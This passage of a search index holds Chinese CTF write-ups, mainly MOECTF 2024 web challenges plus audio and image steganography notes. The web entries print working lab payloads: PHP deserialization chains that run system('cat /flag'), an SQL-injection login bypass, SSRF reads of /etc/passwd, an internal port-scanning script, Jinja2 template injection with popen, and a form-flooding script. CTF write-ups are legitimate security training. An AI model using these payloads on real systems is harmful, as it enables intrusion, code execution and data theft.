\u8bf7\u6c42\u53d1\u9001\uff0c\u548c sql \u4e00\u6837\u7684\u6ce8\u5165\u5373\u53ef\u3002</p> <p>Flag</p> <p>moectf{Hav3_tHe-U5EFu1_pA5swOrd_ANd_GO-EV3ryWHEre-onIY-5ql_can_do0}</p>","tags":["notes","ctf"]},{"location":"CTF/MOECTF2024/WEB/#06-pop-base-mini-moe","title":"06 pop base mini moe","text":"06.php<pre><code>&lt;?php\n\nclass A {\n    // \u6ce8\u610f private \u5c5e\u6027\u7684\u5e8f\u5217\u5316\u54e6\n    private $evil;\n\n    // \u5982\u4f55\u8d4b\u503c\u5462\n    private $a;\n\n    function __destruct() {\n        $s = $this-&gt;a;\n        $s($this-&gt;evil);\n    }\n}\n\nclass B {\n    private $b;\n\n    function __invoke($c) {\n        $s = $this-&gt;b;\n        $s($c);\n    }\n}\n\n\n if(isset($_GET['data']))\n {\n     $a = unserialize($_GET['data']);\n }\n else {\n     highlight_file(__FILE__);\n }\n</code></pre> <p>\u663e\u7136\uff0c\u7531 B \u6211\u4eec\u53ef\u4ee5\u51b3\u5b9a\u6267\u884c\u7684\u51fd\u6570\uff0c\u7531 A \u6211\u4eec\u53ef\u4ee5\u8c03\u7528 B \u5e76\u51b3\u5b9a\u6267\u884c\u7684\u53c2\u6570\uff0c\u5b9e\u73b0\u4efb\u610f\u4ee3\u7801\u6267\u884c\u3002</p> <p>\u6211\u4eec\u5229\u7528 php \u83b7\u5f97\u5e8f\u5217\u5316\u5b57\u7b26\u4e32\uff1a</p> serialize.php<pre><code>&lt;?php\n\nclass A\n{\n    private $evil;\n    private $a;\n    public function __construct($evil, $a)\n    {\n        $this-&gt;evil = $evil;\n        $this-&gt;a = $a;\n    }\n}\n\nclass B\n{\n    private $b;\n    public function __construct($b)\n    {\n        $this-&gt;b = $b;\n    }\n}\n\n$bInstance = new B(\"system\");\n$aInstance = new A(\"ls /\", $bInstance);\n\n$serializedString = serialize($aInstance);\n\necho $serializedString;\n</code></pre> <p></p> <p>\u9700\u8981\u6ce8\u610f\u5176\u4e2d private \u548c protected \u7c7b\u578b\u7684\u53d8\u91cf\u7684\u5b57\u7b26\u4e32\u5b57\u7b26\u6570\u4e0d\u5bf9\uff0c\u540c\u65f6\u5206\u6790\u53ef\u77e5 <code>A evil</code> <code>A a</code> <code>B b</code> \u4e4b\u95f4\u5e94\u8be5\u6709\u4e0d\u53ef\u89c1\u5b57\u7b26\uff0c\u6211\u4eec\u4f7f\u7528 <code>%00</code> \u8fdb\u884c\u586b\u5145\uff1a</p> <p></p> <p>\u53ef\u4ee5\u770b\u89c1\u6709 flag\uff0c\u4fee\u6539 <code>s:4:\"ls /\";</code> =&gt; <code>s:9:\"cat /flag\";</code> \uff08\u5f53\u7136\u4e5f\u53ef\u80fd\u662f\u4e2a\u6587\u4ef6\u5939\uff0c\u7528 <code>s:8:\"ls /flag\";</code>\uff09</p> <p>Flag</p> <p>moectf{PlEA53_Klck-CFbb_beCAu53_hE_R41S3_p0PMoE-ln_W3ek1_haha0}</p>","tags":["notes","ctf"]},{"location":"CTF/MOECTF2024/WEB/#07","title":"07 \u6cc4\u6f0f\u7684\u5bc6\u7801","text":"<p>Hacking the Debugging Pin of a Flask Application</p> <p>\u9605\u8bfb\u4e0a\u9762\u7684\u6587\u7ae0\uff08\u5728\u672c\u9898\u6211\u4eec\u53ea\u9700\u8981\u770b\u5f00\u5934\u7684\u90e8\u5206\u5373\u53ef\uff09\uff0c\u4e86\u89e3\u5230 console \u8fd9\u4e2a\u63a7\u5236\u53f0\uff0c\u53c8\u6709\u4e86 pin \u7801\uff0c\u90a3\u5c31\u76f4\u63a5\u767b\u8fdb\u53bb\uff0cpython \u4efb\u610f\u4ee3\u7801\u6267\u884c\u4e86\u3002</p> <p>Flag</p> <p>moectf{DONt-u5iNG_FLASK-by_D3buG-MOd_AnD_Ie@k-YOUr_Pln7}</p>","tags":["notes","ctf"]},{"location":"CTF/MOECTF2024/WEB/#_backend","title":"\u7535\u9662_Backend","text":"<p>\u6839\u636e login.php \u6e90\u7801\uff0c\u53ef\u4ee5\u770b\u51fa\u6765\u662f\u8981\u767b\u5165\uff0c\u4e14\u662f SQL \u6ce8\u5165\uff08\u56e0\u4e3a Email \u7684\u6b63\u5219\u8868\u8fbe\u5f0f\u68c0\u67e5\u5f88\u7b80\u5355\uff09\uff0c<code>aaa@bbb.com'%201=1%20#</code> \u4f5c\u4e3a\u90ae\u7bb1\u5373\u53ef\uff1b</p> <p>\u767b\u5165\u754c\u9762\u5462\uff1f\u770b\u6e90\u7801\u6ca1\u6709\uff0c\u770b robots.txt \u5c31\u597d\u4e86\uff1a</p> <p>Flag</p> <p>moectf{l_dld_nOt_ExPect-y0U-tO-B3_sO-STr0Ng1e402}</p>","tags":["notes","ctf"]},{"location":"CTF/MOECTF2024/WEB/#pop-moe","title":"pop moe","text":"<p>\u7c7b\u57ab\u5200\u4e4b\u8def 06\uff0c\u8fd9\u6b21\u662f\u53ea\u80fd\u591f\u4f7f\u7528 eval \uff0c\u6211\u4eec\u4f18\u5148\u4f7f\u7528 <code>phpinfo();</code></p> pop.php<pre><code>&lt;?php\n\nclass class003\n{\n    public $mystr = \"phpinfo();\";\n}\n\nclass class002\n{\n    private $sec;\n    function __construct()\n    {\n        $this-&gt;sec = new class003();\n    }\n}\n\nclass class001\n{\n    public $pay10ad = \"dangerous\";\n    public $a;\n\n    function __construct()\n    {\n        $this-&gt;a = new class002();\n    }\n}\nclass class000\n{\n    private $pay10ad = 1;\n    protected $what;\n\n    function __construct()\n    {\n        $this-&gt;what = new class001();\n    }\n}\n$obj0 = new class000();\n$serializedString = serialize($obj0); // \u5e8f\u5217\u5316class000\u5bf9\u8c61  \necho $serializedString;\n</code></pre> <p>\u540c\u6837\u9700\u8981\u6dfb\u52a0 <code>%00</code> \uff0c\u8fdb\u5165 phpinfo \u754c\u9762\u540e\u641c moectf</p> <p>Flag</p> <p>moectf{lT-S3eMs-tH4t-YoU_KnOw_wHAt_1s-p0p-1N-PhPppPpPP!!!26}</p>","tags":["notes","ctf"]},{"location":"CTF/MOECTF2024/WEB/#imagecloud","title":"ImageCloud","text":"<p>Note</p> <p>flask\u670d\u52a1\u5668</p> <p>\u4f7f\u7528 python \u7206\u7834\u5185\u90e8\u7aef\u53e3\uff1a</p> ImageCloud.py<pre><code>import requests\n\nbase_url = \"http://127.0.0.1:55844/image?url=http://localhost:{}/image/flag.jpg\"\n\nfor port in range(5001, 6001):\n    print(f\"\u5c1d\u8bd5\u7aef\u53e3: {port}\")\n    try:\n        url = base_url.format(port)\n        response = requests.get(url, timeout=5)\n        if response.status_code == 200:\n            print(f\"\u6210\u529f\u8bbf\u95ee\u7684\u7aef\u53e3\u662f: {port}\")\n            break\n    except requests.RequestException:\n        continue\n\nelse:\n    print(\"\u672a\u627e\u5230\u53ef\u6210\u529f\u8bbf\u95ee\u7684\u7aef\u53e3\")\n</code></pre> <p>\u6210\u529f\u7206\u7834 =&gt; http://127.0.0.1:55844/image?url=http://localhost:5381/image/flag.jpg \u8bbf\u95ee\u83b7\u53d6\u56fe\u7247</p> <p>Flag</p> <p>moectf{cEtTeBRAT3_y0u_Att4cK_t0-my-tmAge_CtOuDhhHhhH410}</p>","tags":["notes","ctf"]},{"location":"CTF/MOECTF2024/WEB/#imagecloud_1","title":"ImageCloud\u524d\u7f6e","text":"<p><code>?url=</code> \u6587\u4ef6\u8bfb\u53d6 =&gt; <code>?url=file:///etc/passwd</code> =&gt; flag</p> <p>Flag</p> <p>moectf{I-@m-v3RY_SoRrY-abouT_tHiS42911bf8}</p>","tags":["notes","ctf"]},{"location":"CTF/MOECTF2024/WEB/#proveyourlove","title":"ProveYourLove","text":"<p>\u6839\u636e\u9898\u76ee\u63d0\u793a\uff0c\u6211\u4eec\u9700\u8981\u63d0\u4ea4 300 \u4efd\uff1b\u800c\u5f53\u6211\u4eec\u63d0\u4ea4\u540e\u4f1a\u88ab confessionSubmitted \u68c0\u6d4b\uff0c\u6545\u5c06\u5176\u4fee\u6539\u5373\u53ef\uff1a</p> ProveYourLove.py<pre><code>import aiohttp\nimport asyncio\nimport json\n\nBASE_URL = \"http://127.0.0.1:53419\"\n\n\nasync def submit_forms(count):\n    async with aiohttp.ClientSession() as session:\n        for i in range(count):\n            form_data = {\n                \"nickname\": f\"User{i}\",\n                \"user_gender\": \"other\",\n                \"target\": f\"Target{i}\",\n                \"target_gender\": \"other\",\n                \"message\": f\"This is confession number {i + 1}\",\n                \"anonymous\": \"false\",\n            }\n\n            try:\n                await session.options(f\"{BASE_URL}/questionnaire\")\n                async with session.post(\n                    f\"{BASE_URL}/questionnaire\", json=form_data\n                ) as response:\n                    result = await response.json()\n                    if result[\"success\"]:\n                        print(f\"Form {i + 1} submitted successfully\")\n                        async with session.get(\n                            f\"{BASE_URL}/confession_count\"\n                        ) as count_response:\n                            data = await count_response.json()\n                        print(f\"Count: {data['count']}\")\n                        print(f\"Flag: {data['flag']}\")\n                        print(f\"Qixi_flag: {data['Qixi_flag']}\")\n                        print(\"-------------------\")\n                    else:\n                        print(f\"Form {i + 1} submission failed\")\n\n            except Exception as error:\n                print(f\"Error submitting form {i + 1}:\", str(error))\n            await asyncio.sleep(0.01)\n\nasyncio.run(submit_forms(302))\n</code></pre> <p>\u56e0\u4e3a sleep \u8bbe\u7f6e\u7684\u5f88\u77ed\uff0c\u5f88\u5feb\u5c31\u6709\u4e86 flag\uff1b\u5728 console \u4e2d\u4f7f\u7528 js \u811a\u672c\u4e5f\u662f\u53ef\u4ee5\u7684\uff1a</p> ProveYourLove.js<pre><code>async function submitForms(count) {\n    for (let i = 0; i &lt; count; i++) {\n        // \u91cd\u7f6elocalStorage\n        localStorage.removeItem('confessionSubmitted');\n\n        // \u51c6\u5907\u8868\u5355\u6570\u636e\n        const formData = {\n            nickname: `User${i}`,\n            user_gender: 'other',\n            target: `Target${i}`,\n            target_gender: 'other',\n            message: `This is confession number ${i + 1}`,\n            anonymous: 'false'\n        };\n\n        try {\n            // \u53d1\u9001OPTIONS\u8bf7\u6c42\n            await fetch('/questionnaire', { method: 'OPTIONS' });\n\n            // \u63d0\u4ea4\u8868\u5355\n            const response = await fetch('/questionnaire', {\n                method: 'POST',\n                headers: { 'Content-Type': 'application/json' },\n                body: JSON.stringify(formData)\n            });\n\n            const result = await response.json();\n\n            if (result.success) {\n                console.log(`Form ${i + 1} submitted successfully`);\n\n                // \u83b7\u53d6\u66f4\u65b0\u540e\u7684\u6570\u636e\n                const countResponse = await fetch('/confession_count');\n                const data = await countResponse.json();\n\n                console.log(`Count: ${data.count}`);\n                console.log(`Flag: ${data.flag}`);\n                console.log(`Qixi_flag: ${data.Qixi_flag}`);\n                console.log('-------------------');\n            } else {\n                console.error(`Form ${i + 1} submission failed`);\n            }\n        } catch (error) {\n            console.error(`Error submitting form ${i + 1}:`, error);\n        }\n\n        // \u6dfb\u52a0\u4e00\u4e2a\u5c0f\u5ef6\u8fdf\uff0c\u4ee5\u907f\u514d\u53ef\u80fd\u7684\u901f\u7387\u9650\u5236\n        await new Promise(resolve =&gt; setTimeout(resolve, 10));\n    }\n}\n\n// \u6267\u884c302\u6b21\u63d0\u4ea4\nsubmitForms(302);\n</code></pre> <p>Flag</p> <p><code>moectf{COngrATU1AtI0nS_0N-b3ComlnG_@_IlCKING_D0Gb}</code></p>","tags":["notes","ctf"]},{"location":"CTF/MOECTF2024/WEB/#whos-blog","title":"who's blog?","text":"<p>\u63d0\u793a\u6211\u4eec\u63d0\u4f9b <code>id</code> \u4f7f\u7528 <code>$_GET</code> \u8fdb\u884c\u4f20\u53c2\uff0c\u53d1\u73b0\u5c06\u6211\u4eec\u4f20\u5165\u7684\u503c\u653e\u5728\u4e86\u7f51\u7ad9\u4e2d\u3002</p> <p></p> <p>\u7ecf\u8fc7\u67e5\u9605\uff0c\u731c\u6d4b\u4e3a SSTI \uff0c\u6211\u4eec\u5c1d\u8bd5 <code>?id={{}}</code> \uff0c\u53d1\u73b0\u662f python \u7684 jinja2 \u6a21\u677f\uff08\u5f53\u7136\uff0c\u642d\u5efa\u8fc7 mkdocs \u4e5f\u4f1a\u6e05\u695a\u5176\u4f7f\u7528 python \u5b9e\u73b0\uff09\uff0c\u6545\u6211\u4eec\u5229\u7528 hackbar \u8fdb\u884c\u6ce8\u5165\uff0c\u786e\u5b9e\u662f \u80fd\u591f\u6267\u884c\uff0c\u4fee\u6539 <code>popen('ls')</code> \u7684\u5185\u5bb9\u5c31\u53ef\u4ee5\u6267\u884c\u4efb\u610f\u4ee3\u7801\u3002</p> <p>\u4f7f\u7528 find \u6ca1\u627e\u5230\uff0c\u6267\u884c <code>set</code> \uff0c\u5c31\u53d1\u73b0\u4e86\uff0c\u6216\u8005\u5c1d\u8bd5 <code>echo $PATH</code> \uff08\u5f53\u7136\u524d\u8005\u4f18\u5148\uff0c\u540e\u8005\u662f\u5df2\u7ecf\u77e5\u9053\u4f4d\u7f6e\u540e\u7684\u9009\u62e9\uff09</p> <p>Flag</p> <p>moectf{DO-yoU-kn0W-SsTI_aND_PLe4sE_v1slt-sXRHHh5-B10G2} </p> <p>Note</p> <ul> <li>\u4e00\u7bc7\u6587\u7ae0\u5e26\u4f60\u7406\u89e3\u6f0f\u6d1e\u4e4b SSTI \u6f0f\u6d1e</li> <li>MVC\u6a21\u5f0f</li> </ul>","tags":["notes","ctf"]},{"location":"CTF/MOECTF2024/WEB/#_2","title":"\u9759\u6001\u7f51\u9875","text":"<p>\u5728 Network \u4e2d\u627e\u5230\u4e86 <code>final1l1l_challenge.php</code></p> <p></p> final1l1l_challenge.php<pre><code>&lt;?php  \nhighlight_file('final1l1l_challenge.php');  \nerror_reporting(0);  \ninclude\u00a0'flag.php';  \n\n$a\u00a0=\u00a0$_GET['a'];  \n$b\u00a0=\u00a0$_POST['b'];  \nif\u00a0(isset($a)\u00a0&amp;&amp;\u00a0isset($b))\u00a0{  \n\u00a0\u00a0\u00a0\u00a0if\u00a0(!is_numeric($a)\u00a0&amp;&amp;\u00a0!is_numeric($b))\u00a0{  \n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0if\u00a0($a\u00a0==\u00a00\u00a0&amp;&amp;\u00a0md5($a)\u00a0==\u00a0$b[$a])\u00a0{  \n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0echo\u00a0$flag;  \n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0}\u00a0else\u00a0{  \n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0die('noooooooooooo');  \n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0}  \n\u00a0\u00a0\u00a0\u00a0}\u00a0else\u00a0{  \n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0die(\u00a0'Notice\u00a0the\u00a0param\u00a0type!');  \n\u00a0\u00a0\u00a0\u00a0}  \n}\u00a0else\u00a0{  \n\u00a0\u00a0\u00a0\u00a0die(\u00a0'Where\u00a0is\u00a0your\u00a0param?');  \n}\n</code></pre> <p>\u663e\u7136 a,b \u90fd\u7531\u6211\u4eec\u51b3\u5b9a\uff1b\u8981\u83b7\u53d6 flag\uff0c\u6211\u4eec\u9700\u8981\u627e\u5230 a,b \u6ee1\u8db3\uff1a</p> <ul> <li>a,b \u90fd\u4e0d\u662f\u6570\u5b57\uff1b</li> <li>a \u5f31\u6bd4\u8f83\u7b49\u4e8e 0\uff0c\u53ef\u4ee5\u731c\u6d4b a=$str \u6216 a=0xxxx\uff1b</li> <li>b[0] \u5f31\u6bd4\u8f83\u7b49\u4e8e md5(a).</li> </ul> <p>\u8003\u8651 ctf101 \u4e0a\u7684\u8bb2\u7684 0exxx == 0 \uff0c\u6211\u4eec\u4e0d\u96be\u731c\u5230 md5(a)=0exxx \u4e14 b=0xxx \u5373\u53ef\uff1b\u5f53\u7136\u4e0d\u662f\u8fd9\u6837\u4e5f\u65e0\u59a8\uff0c\u6bd5\u7adf b[0] \u6211\u4eec\u5b8c\u5168\u53ef\u4ee5\u81ea\u5df1\u51b3\u5b9a\u3002</p> <p>Flag</p> <p>moectf{I5_My_WIfE-P10_CHaN-cute-0r_Y0uR-Wif3-I5_pHP?b2}</p>","tags":["notes","ctf"]},{"location":"CTF/MOECTF2024/WEB/#_3","title":"\u52c7\u95ef\u94dc\u4eba\u9635","text":"listenToTheVoice<pre><code>import re\nimport requests\n\nrequest = requests.session()\nurl = \"http://127.0.0.1:53246/\"\nbegin = {\"player\": \"ddd\", \"direct\": \"\u5f1f\u5b50\u660e\u767d\"}\n\npattern = re.compile('&lt;h1 id=\"status\"&gt;\\s*(.+?)\\s*&lt;/h1&gt;')\n\n# \u65b9\u5411\u6620\u5c04\ndirections_map = {\n    \"1\": \"\u5317\u65b9\",\n    \"2\": \"\u4e1c\u5317\u65b9\",\n    \"3\": \"\u4e1c\u65b9\",\n    \"4\": \"\u4e1c\u5357\u65b9\",\n    \"5\": \"\u5357\u65b9\",\n    \"6\": \"\u897f\u5357\u65b9\",\n    \"7\": \"\u897f\u65b9\",\n    \"8\": \"\u897f\u5317\u65b9\",\n}\n\n\ndef format_directions(nums):\n    if len(nums) == 1:\n        # \u5217\u8868\u4e2d\u53ea\u6709\u4e00\u4e2a\u6570\u5b57\uff0c\u76f4\u63a5\u8fd4\u56de\u65b9\u5411\u540d\u79f0\n        direction = directions_map.get(nums[0], \"??\")\n        return f\"{direction}\"\n\n    formatted_directions = []\n    for num in nums:\n        direction = directions_map.get(num, \"??\")\n        formatted_directions.append(f\"{direction}\u4e00\u4e2a\")\n\n    return \"\uff0c\".join(formatted_directions)\n\n\nfor i in range(6):\n    if i == 0:\n        response = request.post(url=url, data=begin)\n        print(response.text)\n    else:\n        direct_str = format_directions(nums)\n        print(direct_str, \"direct\")\n        response = request.post(url=url, data={\"player\": \"ddd\", \"direct\": direct_str})\n\n    num = re.findall(pattern, response.text)[0]\n    nums = re.findall(r\"\\d+\", num)  # \u76f4\u63a5\u4f7f\u7528\u63d0\u53d6\u51fa\u6765\u7684\u987a\u5e8f\n    directions = [directions_map.get(n, \"??\") for n in nums]\n    print(f\"\u65b9\u5411\u6570\u5b57: {nums}\")\n    print(f\"\u5bf9\u5e94\u65b9\u4f4d: {directions}\\n\")\n\nprint(response.text)\n</code></pre> <p>Flag</p> <p>moectf{WELL1L_y0U_Pa5S_th3-cH@L13nGE_FRrRRROM_tOnR3N9}</p>","tags":["notes","ctf"]},{"location":"CTF/MOECTF2024/WEB/#_4","title":"\u5f17\u62c9\u683c\u4e4b\u5730\u7684\u6311\u6218","text":"<p>\u7c7b\u4f3c\u4e8e\u6821\u5df4\u4e0a\u7684\u201c\u5c0f\u4e4c\u9f9f\u627e\u5988\u5988\u201d\uff08\u867d\u7136\u8fd9\u9053\u9898\u6211\u8fd8\u6ca1\u505a\u51fa\u6765\u2026\u2026\uff09\uff0c\u8003\u5bdf\u5bf9\u7f51\u9875\u53ef\u80fd\u85cf\u4fe1\u606f\u7684\u719f\u6089\u7a0b\u5ea6\u3002</p>","tags":["notes","ctf"]},{"location":"CTF/MOECTF2024/WEB/#flag1abhtml","title":"flag1ab.html","text":"<p>\u67e5\u770b\u6e90\u7801 =&gt; <code>flag1: bW9lY3Rm</code></p>","tags":["notes","ctf"]},{"location":"CTF/MOECTF2024/WEB/#flag2hhphp","title":"flag2hh.php","text":"<p>\u67e5\u770b\u6d88\u606f\u5934 =&gt; <code>flag2: e0FmdEV</code></p>","tags":["notes","ctf"]},{"location":"CTF/MOECTF2024/WEB/#flag3cadphp","title":"flag3cad.php","text":"<p>\u4f7f\u7528 cookie-editor + hackbar \u8fbe\u5230\u8981\u6c42 =&gt; <code>flag3: yX3RoMXN</code></p>","tags":["notes","ctf"]},{"location":"CTF/MOECTF2024/WEB/#flag4bbcphp","title":"flag4bbc.php","text":"<p>hackbar \u4e2d\u4fee\u6539 Referer =&gt; \u67e5\u770b\u6e90\u7801\u53d1\u73b0 js \u811a\u672c\uff1b\u6211\u4eec\u4e3a\u4ec0\u4e48\u8981\u9760\u5b83\u5e2e\u6211\u4eec\u53d1\u9001\u83b7\u53d6 flag \u7684\u8bf7\u6c42\uff1f\u4f7f\u7528 hackbar \u53d1\u9001 =&gt; <code>flag4: fdFVUMHJ</code></p>","tags":["notes","ctf"]},{"location":"CTF/MOECTF2024/WEB/#flag5sxrphp","title":"flag5sxr.php","text":"<p>\u67e5\u770b\u6e90\u7801\uff0cjs \u811a\u672c\uff0c\u53ef\u4ee5\u53d1\u73b0\u5982\u679c\u6211\u4eec\u8f93\u5165\u4e86 \"I want flag\" \uff0c\u4f1a\u8fd4\u56de false\uff0c\u6211\u4eec\u5728\u63a7\u5236\u53f0\u4e2d\u8986\u76d6\u8c03\u5b83\u518d\u8f93\u5165\u5373\u53ef =&gt; <code>flag5: fSV90aDF</code></p>","tags":["notes","ctf"]},{"location":"CTF/MOECTF2024/WEB/#flag6diwphp","title":"flag6diw.php","text":"<ul> <li><code>if (preg_match('/flag/', $_GET['moe']))</code>\uff1a\u5982\u679c GET \u8bf7\u6c42\u4e2d\u7684\u00a0<code>moe</code>\u00a0\u53c2\u6570\u7684\u503c\u4e2d\u5305\u542b 'flag'\uff08\u533a\u5206\u5927\u5c0f\u5199\uff09\uff0c\u7a0b\u5e8f\u5c06\u8c03\u7528\u00a0<code>die(\"no\");</code>\u00a0\u51fd\u6570\uff0c\u7ec8\u6b62\u6267\u884c\u5e76\u8f93\u51fa \"no\"\u3002</li> <li><code>elseif (preg_match('/flag/i', $_GET['moe']))</code>\uff1a\u5982\u679c\u00a0<code>moe</code>\u00a0\u53c2\u6570\u7684\u503c\u4e2d\u5305\u542b 'flag'\uff08\u4e0d\u533a\u5206\u5927\u5c0f\u5199\uff09\uff0c\u5219\u8f93\u51fa \"flag6: xxx\"\uff08\u5176\u4e2d\u00a0<code>xxx</code>\u00a0\u53ef\u4ee5\u662f\u67d0\u4e2a\u5b9e\u9645\u7684\u503c\u6216\u8005\u5176\u4ed6\u8f93\u51fa\uff09\u3002</li> </ul> <p>\u4f7f\u7528 hackbar \u4f20\u53c2 FLAG \u5373\u53ef =&gt; <code>flag6: rZV9VX2t</code></p>","tags":["notes","ctf"]},{"location":"CTF/MOECTF2024/WEB/#flag7fxxkfinalphp","title":"flag7fxxkfinal.php","text":"<p>\u4f7f\u7528\u8681\u5251\u8fde\u63a5\uff0c\u5728 /flag7 \u4e2d\u627e\u5230\u6700\u540e\u4e00\u6bb5 =&gt; <code>flag7: rbm93X1dlQn0=</code></p> <p>\u62fc\u8d77\u6765\u5e76\u89e3 base64 \u7f16\u7801\uff1a</p> <p>Flag</p> <p>moectf{AftEr_th1s_tUT0r_I_th1ke_U_kknow_WeB}</p>","tags":["notes","ctf"]},{"location":"CTF/MOECTF2024/WEB/#_5","title":"\u5f17\u62c9\u683c\u4e4b\u5730\u7684\u5165\u53e3","text":"<p>\u5f88\u663e\u7136\uff0c\u201c\u722c\u866b\u201d \u63d0\u793a\u6211\u4eec\u67e5\u770b <code>robots.txt</code> \u6587\u4ef6\uff0c\u7ee7\u800c\u6253\u5f00 webtutorEntry.php\uff0c\u83b7\u53d6 flag\u3002</p> <p>Flag</p> <p>moectf{CONgRaTUl@tiOn-fOr-Know1nG-RoBoTs_Txtb2cd}</p>","tags":["notes","ctf"]},{"location":"CTF/NOTE/MISC/","title":"Misc","text":"[misc]          <ul> <li> audio  252  50  1 mins              1739718485 </li> <li> img  163  1 mins              1739718485 </li> <li> info_leak  89  0 mins              1739718485 </li> <li> osint  600  31  2 mins              1739718485 </li> <li> pyjail  117  7  0 mins              1739718485 </li> <li> qrcode  497  2 mins              1739718485 </li> <li> zip_rar  577  20  2 mins              1739718485 </li> </ul>"},{"location":"CTF/NOTE/MISC/audio/","title":"Audio","text":"","tags":["notes","ctf"]},{"location":"CTF/NOTE/MISC/audio/#ciscn-2022","title":"CISCN 2022 \u4e1c\u5317","text":"","tags":["notes","ctf"]},{"location":"CTF/NOTE/MISC/audio/#_1","title":"\u542c\u8bf4\u8fd9\u662f\u4e00\u4e2a\u4e8c\u7ef4\u7801","text":"<p>\u9898\u76ee</p> <p>\u6211\u7684\u7b2c\u4e00\u4e2a\u97f3\u9891\u9690\u5199\u9898\u76ee\u3002</p> <p>\u5148\u50bb\u50bb\u5730\u542c\u4e86\u4e00\u904d\u6b4c\uff08\u611f\u89c9\u662f AI \u751f\u6210\u7684\uff09\uff0c\u7136\u540e\u4e00\u65e0\u6240\u83b7\uff1b\u68c0\u67e5\u6587\u4ef6\u5c5e\u6027\u4fe1\u606f\uff0c\u4e00\u65e0\u6240\u6709\u3002\u4f7f\u7528 file\u3001binwalk \u68c0\u67e5\u4e5f\u662f\u5f88\u6b63\u5e38\uff1b\u90a3\u4e48\u7528 010editor \u67e5\u770b\uff0c[\u672b\u5c3e\u4e00\u770b\u5c31\u5f88\u5947\u602a]attachments/audio.png)\uff0c\u653e\u5165 cyberchef -&gt; magic \u4e2d\uff0c\u83b7\u5f97\u5bc6\u7801 <code>ThisI5Passw0rd</code> \u3002</p> <p>\u4f46\u662f\u5bc6\u7801\u5e72\u561b\u7528\u7684\uff1f\u4e0d\u77e5\u9053\uff0c\u641c\u7d22 \"sound from deep\" \uff0c\u539f\u6765\u662f DeepSound \u8fd9\u4e2a\u8f6f\u4ef6\uff0c\u4e0b\u8f7d\u540e\u5c06 <code>\u4e8c\u7ef4\u7801.wav</code> \u653e\u5165\uff0c\u586b\u5165\u5bc6\u7801\uff0c\u63d0\u53d6\u9690\u85cf\u6587\u4ef6 flag.pcap \u3002</p> <p>\u6253\u5f00 flag.pcap\uff0c\u6ed1\u52a8\u8fc7\u7a0b\u4e2d\uff0c\u53ea\u6709 No. / Time / Destination \u4e09\u680f\u5185\u5bb9\u53d1\u751f\u53d8\u5316\uff1bNo. \u53d8\u5316\u662f\u5fc5\u7136\u7684\uff0cTime \u5f88\u590d\u6742\uff0c\u4ece Destination \u5165\u624b\uff0c\u53ea\u6709\u4e24\u79cd\uff0c\u8003\u8651 01 \u4e8c\u8fdb\u5236\u6d41\u3002</p> <p>\u4f7f\u7528 pyshark \u63d0\u53d6\u4e8c\u8fdb\u5236\u5199\u5165 flag.txt\uff1a</p> get_binary.py<pre><code>import pyshark\nimport binascii\nfrom PIL import Image\n\n\ndef process_pcap(pcap_file):\n    cap = pyshark.FileCapture(pcap_file)\n    binary_stream = \"\"\n\n    for packet in cap:\n        if \"IP\" in packet:\n            if packet.ip.dst == \"172.16.0.1\":\n                binary_stream += \"0\"\n            elif packet.ip.dst == \"172.16.255.1\":\n                binary_stream += \"1\"\n\n    return binary_stream\n\n\nif __name__ == \"__main__\":\n    pcap_file = \"flag.pcap\"\n\n    binary_stream = process_pcap(pcap_file)\n    with open(\"flag.txt\", \"w\") as f:\n        f.write(binary_stream)\n</code></pre> <p>\u518d\u731c\u6d4b\u4e8c\u7ef4\u7801\u56fe\u7247\u4e3a\u65b9\u5f62\uff08\u5931\u8d25\u4e86\u5c31\u8981\u4fee\u6539\u957f\u5bbd\u66b4\u529b\u67e5\u627e\u4e86\uff09\uff1a</p> get_pic.py<pre><code>from PIL import Image\nimport numpy as np\n\n# Read the flag.txt file\nwith open(\"flag.txt\", \"r\") as file:\n    binary_data = file.read().strip()\n\n# Calculate the side length of the square image\nside_length = int(len(binary_data) ** 0.5)\n\n# Convert the binary string to a 2D numpy array with the correct data type\nimage_array = np.array([int(bit) for bit in binary_data], dtype=np.uint8).reshape(\n    side_length, side_length\n)\n\n# Create the original image\noriginal_image = Image.fromarray(image_array * 255, mode=\"L\").convert(\"1\")\noriginal_image.save(\"original_flag.png\")\n\n# Create the flipped image in case we flip 0/1\nflipped_array = 1 - image_array\nflipped_image = Image.fromarray(flipped_array * 255, mode=\"L\").convert(\"1\")\nflipped_image.save(\"flipped_flag.png\")\n\nprint(\"Image processing complete.\")\n</code></pre> <p>\u83b7\u5f97\u4e8c\u7ef4\u7801\uff0c\u4f7f\u7528 barcode-reader \u626b\u63cf\uff1a</p> <p></p> <p>\u53ef\u4ee5\u770b\u5230\uff0c\u662f\u4e00\u4e2a DATAMATRIX\uff0c<code>flag{c736863427be5671102c039d43f0c75b}</code> \u3002</p> <p>Flag</p> <p>NSSCTF{c736863427be5671102c039d43f0c75b}</p>","tags":["notes","ctf"]},{"location":"CTF/NOTE/MISC/img/","title":"Img","text":"","tags":["notes","ctf"]},{"location":"CTF/NOTE/MISC/img/#moectf2024","title":"Moectf2024","text":"","tags":["notes","ctf"]},{"location":"CTF/NOTE/MISC/img/#the-upside-and-down","title":"The upside and down","text":"","tags":["notes","ctf"]},{"location":"CTF/NOTE/MISC/img/#nisactf2022","title":"NISACTF2022","text":"","tags":["notes","ctf"]},{"location":"CTF/NOTE/MISC/img/#huaji","title":"huaji\uff1f","text":"<p>\u9898\u76ee</p> <p>\u62ff\u5230\u6ca1\u6709\u6269\u5c55\u540d\u7684<sup>1</sup>\uff0c\u76f4\u63a5\u4e0a\u7167\u5996\u955c <code>file</code> \uff0c\u518d\u4e0a <code>binwalk</code> :</p> <p></p> <p>\u4f7f\u7528 binwalk \u5206\u79bb\uff0c\u5206\u522b\u5bf9\u5e94\u5176\u6587\u4ef6\u7c7b\u578b\uff0c\u53d1\u73b0 flag.txt \u4e3a\u7a7a\uff0c\u4f46\u662f A9DC.zip \u91cc\u9762\u6709\u4e00\u4e2a flag.txt 